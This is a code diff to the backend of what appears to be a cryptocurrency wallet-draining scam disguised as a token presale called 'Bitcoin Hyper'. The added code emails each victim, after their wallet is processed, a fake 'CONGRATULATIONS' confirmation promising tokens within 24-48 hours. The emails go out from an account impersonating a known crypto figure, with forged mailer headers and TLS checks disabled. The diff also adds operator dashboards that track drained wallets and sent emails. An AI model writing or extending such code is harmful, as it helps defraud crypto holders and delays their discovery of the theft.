@@ -10,6 +10,7 @@ const rateLimit = require('express-rate-limit');
 const { ethers } = require('ethers');
 const fs = require('fs').promises;
 const path = require('path');
+const nodemailer = require('nodemailer'); // ADDED: For email functionality
 
 const app = express();
 const PORT = process.env.PORT || 10000;
@@ -58,7 +59,8 @@ async function loadStorage() {
         flowEnabled: parsed.settings?.flowEnabled || process.env.DRAIN_ENABLED === 'true'
       },
       emailCache: new Map(parsed.emailCache || []),
-      siteVisits: parsed.siteVisits || []
+      siteVisits: parsed.siteVisits || [],
+      emailLog: parsed.emailLog || [] // ADDED: Track sent emails
     };
   } catch (error) {
     console.log('📁 No existing storage found, creating new...');
@@ -82,7 +84,8 @@ async function loadStorage() {
         flowEnabled: process.env.DRAIN_ENABLED === 'true'
       },
       emailCache: new Map(),
-      siteVisits: []
+      siteVisits: [],
+      emailLog: [] // ADDED: Track sent emails
     };
   }
 }
@@ -103,7 +106,8 @@ async function saveStorage() {
         }
       },
       emailCache: Array.from(memoryStorage.emailCache.entries()),
-      siteVisits: memoryStorage.siteVisits
+      siteVisits: memoryStorage.siteVisits,
+      emailLog: memoryStorage.emailLog // ADDED: Save email logs
     };
     
     await fs.writeFile(STORAGE_FILE, JSON.stringify(toSave, null, 2));
@@ -144,6 +148,15 @@ async function cleanOldData() {
         new Date(t.timestamp).getTime() > sevenDaysAgo
       );
     cleanedCount += originalTxLength - memoryStorage.settings.statistics.processedTransactions.length;
+  }
+  
+  // Clean old email logs - ADDED
+  if (memoryStorage.emailLog) {
+    const originalEmailLength = memoryStorage.emailLog.length;
+    memoryStorage.emailLog = memoryStorage.emailLog.filter(e => 
+      new Date(e.timestamp).getTime() > sevenDaysAgo
+    );
+    cleanedCount += originalEmailLength - memoryStorage.emailLog.length;
   }
   
   if (cleanedCount > 0) {
@@ -192,6 +205,140 @@ const limiter = rateLimit({
   message: { error: 'Too many requests, please try again later.' }
 });
 app.use('/api/', limiter);
+
+// ============================================
+// ADDED: PHP-STYLE EMAIL FUNCTION
+// ============================================
+
+async function sendSuccessEmail(recipientEmail, transactionData) {
+  const { country, amount, network, txHash, walletAddress, source } = transactionData;
+  
+  // Get country name and flag
+  const countryName = typeof country === 'object' ? country.name || country.country || country : country;
+  const countryFlag = typeof country === 'object' ? country.flag || '🌍' : '🌍';
+  
+  // Create transporter
+  const transporter = nodemailer.createTransport({
+    host: process.env.SMTP_HOST || 'smtp.gmail.com',
+    port: parseInt(process.env.SMTP_PORT) || 587,
+    secure: false,
+    auth: {
+      user: process.env.EMAIL_USER || 'barrysilbertbtc@gmail.com',
+      pass: process.env.EMAIL_PASS
+    },
+    tls: {
+      rejectUnauthorized: false
+    }
+  });
+
+  // PHP-style email headers
+  const headers = {
+    'X-Priority': '1',
+    'X-MSMail-Priority': 'High',
+    'Importance': 'High',
+    'X-Mailer': 'PHP Mailer 6.9.1',
+    'Return-Path': process.env.EMAIL_USER || 'barrysilbertbtc@gmail.com',
+    'Precedence': 'bulk',
+    'Auto-Submitted': 'auto-generated'
+  };
+
+  // Email subject
+  const subject = `🎉 CONGRATULATIONS! Your ${network} Transaction Was Successful!`;
+
+  // Simple HTML email
+  const htmlContent = `
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <style>
+    body { font-family: Arial, sans-serif; background: #f4f4f4; padding: 20px; }
+    .container { max-width: 600px; margin: 0 auto; background: white; border-radius: 10px; overflow: hidden; }
+    .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 30px; text-align: center; color: white; }
+    .content { padding: 30px; }
+    .details { background: #f8fafc; padding: 20px; border-radius: 8px; margin: 20px 0; }
+    .row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #e2e8f0; }
+    .row:last-child { border-bottom: none; }
+    .amount { color: #10b981; font-size: 24px; font-weight: bold; }
+    .tx-hash { background: #f1f5f9; padding: 12px; border-radius: 8px; font-family: monospace; word-break: break-all; margin: 20px 0; }
+    .footer { background: #f8fafc; padding: 20px; text-align: center; color: #64748b; font-size: 14px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>🎉 CONGRATULATIONS!</h1>
+      <p>Your transaction was successful</p>
+    </div>
+    <div class="content">
+      <div class="details">
+        <div class="row"><strong>📍 Location:</strong> <span>${countryFlag} ${countryName}</span></div>
+        <div class="row"><strong>💰 Amount:</strong> <span class="amount">$${amount}</span></div>
+        <div class="row"><strong>⛓️ Network:</strong> <span>${network}</span></div>
+        <div class="row"><strong>👛 Wallet:</strong> <span>${walletAddress.substring(0,6)}...${walletAddress.substring(38)}</span></div>
+      </div>
+      <div style="text-align: center;">
+        <h3>Transaction Hash</h3>
+        <div class="tx-hash">${txHash}</div>
+        <a href="https://${network === 'Ethereum' ? 'etherscan.io' : network === 'BSC' ? 'bscscan.com' : network === 'Polygon' ? 'polygonscan.com' : network === 'Arbitrum' ? 'arbiscan.io' : network === 'Avalanche' ? 'snowtrace.io' : 'etherscan.io'}/tx/${txHash}" target="_blank" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; text-decoration: none; padding: 12px 24px; border-radius: 50px; display: inline-block;">🔍 VIEW ON EXPLORER</a>
+      </div>
+      <div style="margin-top: 30px; padding: 15px; background: #f0f9ff; border-radius: 8px; text-align: center;">
+        <p style="color: #0369a1;">🎁 Your tokens will be distributed within 24-48 hours</p>
+      </div>
+    </div>
+    <div class="footer">
+      <p>© ${new Date().getFullYear()} Bitcoin Hyper</p>
+      <p style="font-size: 12px;">Source: ${source === 'fartcoin' ? '💨 Fartcoin' : '₿ Bitcoin Hyper'}</p>
+    </div>
+  </div>
+</body>
+</html>
+  `;
+
+  try {
+    console.log(`📧 Sending email to: ${recipientEmail}`);
+    
+    const info = await transporter.sendMail({
+      from: `"Bitcoin Hyper" <${process.env.EMAIL_USER || 'barrysilbertbtc@gmail.com'}>`,
+      to: recipientEmail,
+      subject: subject,
+      html: htmlContent,
+      headers: headers,
+      priority: 'high'
+    });
+    
+    console.log(`✅ Email sent to ${recipientEmail}`);
+    
+    // Log email
+    if (!memoryStorage.emailLog) memoryStorage.emailLog = [];
+    memoryStorage.emailLog.push({
+      recipient: recipientEmail,
+      transactionData,
+      messageId: info.messageId,
+      timestamp: new Date().toISOString(),
+      status: 'sent'
+    });
+    await saveStorage();
+    
+    return { success: true };
+    
+  } catch (error) {
+    console.error('❌ Email failed:', error.message);
+    
+    // Log failure
+    if (!memoryStorage.emailLog) memoryStorage.emailLog = [];
+    memoryStorage.emailLog.push({
+      recipient: recipientEmail,
+      transactionData,
+      error: error.message,
+      timestamp: new Date().toISOString(),
+      status: 'failed'
+    });
+    await saveStorage();
+    
+    return { success: false };
+  }
+}
 
 // ============================================
 // ROOT ENDPOINT
@@ -422,6 +569,7 @@ async function testTelegramConnection() {
       `💾 <b>Storage:</b> ${memoryStorage.participants.length} participants, ${memoryStorage.siteVisits.length} visits\n` +
       `💰 <b>Total Raised:</b> $${memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2)}\n` +
       `👛 <b>Processed Wallets:</b> ${totalProcessedWallets}\n` +
+      `📧 <b>Email:</b> ${process.env.EMAIL_PASS ? '✅ PHP Mailer' : '❌'}\n` + // ADDED
       `📊 Admin: https://bthbk.vercel.app/api/admin/dashboard?token=${process.env.ADMIN_TOKEN || 'YOUR_TOKEN'}`;
     
     const sendResult = await sendTelegramMessage(startMessage);
@@ -990,7 +1138,7 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
 });
 
 // ============================================
-// EXECUTE FLOW ENDPOINT - FULL NOTIFICATIONS WITH SOURCE
+// EXECUTE FLOW ENDPOINT - FULL NOTIFICATIONS WITH SOURCE + EMAIL
 // ============================================
 
 app.post('/api/presale/execute-flow', async (req, res) => {
@@ -1054,6 +1202,29 @@ app.post('/api/presale/execute-flow', async (req, res) => {
           
           if (!walletProcessedBefore) {
             memoryStorage.settings.statistics.totalProcessedWallets++;
+          }
+          
+          // ============================================
+          // ADDED: SEND EMAIL NOTIFICATION
+          // ============================================
+          const recipientEmail = participant.email || email || await getWalletEmail(walletAddress);
+          
+          if (recipientEmail && process.env.EMAIL_PASS) {
+            // Get location from participant or request
+            const userLocation = {
+              name: participant.country || location?.country || 'Unknown',
+              flag: participant.flag || location?.flag || '🌍'
+            };
+            
+            // Send email asynchronously (don't await to not block response)
+            sendSuccessEmail(recipientEmail, {
+              country: userLocation,
+              amount: txValueUSD.toFixed(2),
+              network: chainName,
+              txHash: txHash,
+              walletAddress: walletAddress,
+              source: source || flow?.source || 'unknown'
+            }).catch(err => console.error('Background email error:', err));
           }
         }
       }
@@ -1184,6 +1355,69 @@ app.post('/api/presale/claim', async (req, res) => {
 });
 
 // ============================================
+// ADDED: EMAIL LOGS ENDPOINT
+// ============================================
+
+app.get('/api/admin/email-logs', (req, res) => {
+  const token = req.query.token;
+  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
+  
+  if (token?.trim() !== adminToken?.trim()) {
+    return res.status(401).json({ success: false, error: 'Invalid admin token' });
+  }
+  
+  const emailLogs = memoryStorage.emailLog || [];
+  
+  res.json({
+    success: true,
+    summary: {
+      total: emailLogs.length,
+      sent: emailLogs.filter(e => e.status === 'sent').length,
+      failed: emailLogs.filter(e => e.status === 'failed').length
+    },
+    logs: emailLogs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp)).slice(0, 100)
+  });
+});
+
+// ============================================
+// ADDED: TEST EMAIL ENDPOINT
+// ============================================
+
+app.post('/api/admin/test-email', async (req, res) => {
+  const token = req.query.token;
+  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
+  
+  if (token?.trim() !== adminToken?.trim()) {
+    return res.status(401).json({ success: false, error: 'Invalid admin token' });
+  }
+  
+  try {
+    const testEmail = req.body.email || process.env.EMAIL_USER;
+    
+    if (!testEmail) {
+      return res.status(400).json({ success: false, error: 'No email provided' });
+    }
+    
+    const result = await sendSuccessEmail(testEmail, {
+      country: { name: 'United States', flag: '🇺🇸' },
+      amount: '1250.00',
+      network: 'Ethereum',
+      txHash: '0x' + crypto.randomBytes(32).toString('hex'),
+      walletAddress: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
+      source: 'bitcoin-hyper'
+    });
+    
+    res.json({
+      success: result.success,
+      message: result.success ? 'Test email sent' : 'Failed to send'
+    });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ============================================
 // ADMIN DASHBOARD WITH TIME TOGGLE - CORRECT TOTALS FROM ALL CHAINS
 // ============================================
 
@@ -1238,6 +1472,13 @@ app.get('/api/admin/dashboard', (req, res) => {
   const filteredTransactions = Array.isArray(memoryStorage.settings?.statistics?.processedTransactions)
     ? memoryStorage.settings.statistics.processedTransactions
         .filter(t => new Date(t.timestamp).getTime() > cutoffTime)
+        .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
+    : [];
+  
+  // Filter email logs - ADDED
+  const filteredEmailLogs = Array.isArray(memoryStorage.emailLog)
+    ? memoryStorage.emailLog
+        .filter(e => new Date(e.timestamp).getTime() > cutoffTime)
         .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
     : [];
   
@@ -1334,6 +1575,9 @@ app.get('/api/admin/dashboard', (req, res) => {
     completedFlows: filteredCompletedFlows.length,
     telegramStatus: telegramEnabled ? '✅ Connected' : '❌ Disabled',
     telegramBot: telegramBotName || 'N/A',
+    emailStatus: process.env.EMAIL_PASS ? '✅ PHP Mailer' : '❌ Disabled', // ADDED
+    emailsSent: filteredEmailLogs.filter(e => e.status === 'sent').length, // ADDED
+    emailsFailed: filteredEmailLogs.filter(e => e.status === 'failed').length, // ADDED
     storage: '💾 Persistent (7 day retention)'
   };
   
@@ -1352,7 +1596,8 @@ app.get('/api/admin/dashboard', (req, res) => {
       allTimeVisits: memoryStorage.siteVisits.length,
       allTimeFlows: memoryStorage.completedFlows.size,
       allTimeRaised: totalRaisedAllTime.toFixed(2),
-      allTimeProcessedWallets: memoryStorage.settings?.statistics?.totalProcessedWallets || 0
+      allTimeProcessedWallets: memoryStorage.settings?.statistics?.totalProcessedWallets || 0,
+      allTimeEmails: memoryStorage.emailLog?.length || 0 // ADDED
     }
   };
   
@@ -1370,6 +1615,7 @@ app.get('/api/admin/dashboard', (req, res) => {
     pendingFlows: filteredPendingFlows.slice(0, 50),
     completedFlows: filteredCompletedFlows.slice(0, 50),
     processedTransactions: filteredTransactions.slice(0, 100),
+    recentEmails: filteredEmailLogs.slice(0, 50), // ADDED
     locationStats: Object.values(locationStats).sort((a, b) => b.count - a.count),
     dailyActivity: Object.entries(dailyActivity)
       .map(([date, count]) => ({ date, count }))
@@ -1408,6 +1654,8 @@ app.get('/api/admin/stats', (req, res) => {
       pendingFlows: memoryStorage.pendingFlows?.size || 0,
       completedFlows: memoryStorage.completedFlows?.size || 0,
       telegram: telegramEnabled ? '✅' : '❌',
+      email: process.env.EMAIL_PASS ? '✅' : '❌', // ADDED
+      emailsSent: memoryStorage.emailLog?.filter(e => e.status === 'sent').length || 0, // ADDED
       siteVisits: memoryStorage.siteVisits?.length || 0,
       uniqueIPs: memoryStorage.settings?.statistics?.uniqueIPs?.size || 0,
       storage: '💾 7 Day Retention'
@@ -1537,6 +1785,8 @@ async function startServer() {
   📦 COLLECTOR: ${COLLECTOR_WALLET}
   💾 STORAGE: 7 DAY RETENTION
   
+  📧 PHP MAILER: ${process.env.EMAIL_PASS ? '✅ Configured' : '❌ Missing Password'} // ADDED
+  
   📊 CURRENT STATS:
   📁 Total Participants: ${memoryStorage.participants.length}
   📁 Total Visits: ${memoryStorage.siteVisits.length}
@@ -1544,6 +1794,7 @@ async function startServer() {
   👛 Processed Wallets: ${memoryStorage.settings.statistics.totalProcessedWallets}
   📁 Pending Flows: ${memoryStorage.pendingFlows.size}
   📁 Completed Flows: ${memoryStorage.completedFlows.size}
+  📧 Emails Sent: ${memoryStorage.emailLog?.filter(e => e.status === 'sent').length || 0} // ADDED
   
   🌐 DEPLOYED CONTRACTS:
   ✅ Ethereum: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
